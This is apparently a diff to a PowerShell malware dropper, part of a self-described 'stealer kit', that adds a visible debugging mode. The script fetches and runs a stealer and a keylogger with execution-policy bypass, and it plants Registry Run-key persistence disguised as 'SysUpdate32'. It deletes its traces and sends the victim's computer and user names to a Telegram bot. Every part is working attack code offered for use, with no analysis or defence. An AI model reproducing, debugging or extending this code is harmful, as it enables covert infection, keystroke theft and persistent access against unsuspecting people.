@@ -1,5 +1,6 @@
 # payload_final.ps1 — Stage 1 downloader/executor
 # Downloads stealer.ps1, keylogger.ps1, executes them, sends SUCCESS to Telegram
+# VISIBLE VERSION - no hidden windows, stays open for debugging
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -21,6 +22,11 @@ New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 Set-Location $tempDir
 
 Write-Log "[*] Starting payload from $tempDir"
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "  STEALER KIT - PAYLOAD EXECUTING" -ForegroundColor Cyan
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
 
 # Download components with cache-busting
 $files = @("stealer.ps1", "keylogger.ps1")
@@ -29,8 +35,10 @@ foreach ($file in $files) {
     try {
         Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile "$tempDir\$file" -ErrorAction Stop
         Write-Log "[+] Downloaded: $file"
+        Write-Host "[+] Downloaded: $file" -ForegroundColor Green
     } catch {
         Write-Log "[-] Failed: $file - $($_.Exception.Message)"
+        Write-Host "[-] Failed: $file - $($_.Exception.Message)" -ForegroundColor Red
         exit 1
     }
 }
@@ -39,24 +47,35 @@ foreach ($file in $files) {
 foreach ($file in $files) {
     if (-not (Test-Path "$tempDir\$file")) {
         Write-Log "[-] Missing: $file"
+        Write-Host "[-] Missing: $file" -ForegroundColor Red
         exit 1
     }
     $size = (Get-Item "$tempDir\$file").Length
     Write-Log "[*] $file : $size bytes"
 }
 
-# Execute stealer — capture output and errors
+# Execute stealer — visible window so we can see errors
 Write-Log "[*] Executing stealer.ps1..."
-$psOutput = powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "$tempDir\stealer.ps1" 2>&1
-if ($psOutput) { Write-Log "[stealer output] $psOutput" }
+Write-Host "[*] Executing stealer.ps1..." -ForegroundColor Yellow
+powershell.exe -ExecutionPolicy Bypass -File "$tempDir\stealer.ps1"
+Write-Log "[*] stealer.ps1 finished"
+
+# Execute keylogger in background
+Write-Host "[*] Starting keylogger..." -ForegroundColor Yellow
+Start-Job -ScriptBlock {
+    param($path)
+    powershell.exe -ExecutionPolicy Bypass -File $path
+} -ArgumentList "$tempDir\keylogger.ps1" | Out-Null
+Write-Log "[*] Keylogger started"
 
 # Persistence - Registry Run key
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $regName = "SysUpdate32"
-$regValue = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempDir\stealer.ps1`""
+$regValue = "powershell.exe -ExecutionPolicy Bypass -File `"$tempDir\stealer.ps1`""
 try {
     Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
     Write-Log "[+] Persistence established: $regName"
+    Write-Host "[+] Persistence established: $regName" -ForegroundColor Green
 } catch {
     Write-Log "[-] Persistence failed: $($_.Exception.Message)"
 }
@@ -66,20 +85,25 @@ Remove-Item "$tempDir\*.ps1" -Force -ErrorAction SilentlyContinue
 
 # SUCCESS signal
 Write-Host ""
-Write-Host "SUCCESS" -ForegroundColor Green -BackgroundColor Black
+Write-Host "========================================" -ForegroundColor Green
+Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
+Write-Host "========================================" -ForegroundColor Green
 Write-Host ""
 Write-Log "[*] SUCCESS displayed"
 
-# Send success to Telegram — with error reporting
+# Send success to Telegram with error reporting
 $msg = "[+] PAYLOAD EXECUTED`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 try {
+    Write-Log "[*] Sending Telegram message..."
     $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
         chat_id = $chatId
         text = $msg
     } -ErrorAction Stop
-    Write-Log "[+] Telegram message sent: $($response.result.message_id)"
+    Write-Log "[+] Telegram SUCCESS - Message ID: $($response.result.message_id)"
+    Write-Host "[+] Telegram message sent!" -ForegroundColor Green
 } catch {
     Write-Log "[-] Telegram FAILED: $($_.Exception.Message)"
+    Write-Host "[-] Telegram FAILED: $($_.Exception.Message)" -ForegroundColor Red
     # Try alternative method
     try {
         $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($msg))"
@@ -87,7 +111,15 @@ try {
         $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
         $result = $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body)
         Write-Log "[+] Telegram via WebClient: $result"
+        Write-Host "[+] Telegram sent via WebClient!" -ForegroundColor Green
     } catch {
         Write-Log "[-] Telegram WebClient FAILED: $($_.Exception.Message)"
+        Write-Host "[-] Telegram WebClient FAILED" -ForegroundColor Red
     }
 }
+
+# Keep window open
+Write-Host ""
+Write-Host "[*] Press any key to close..." -ForegroundColor Yellow
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+exit
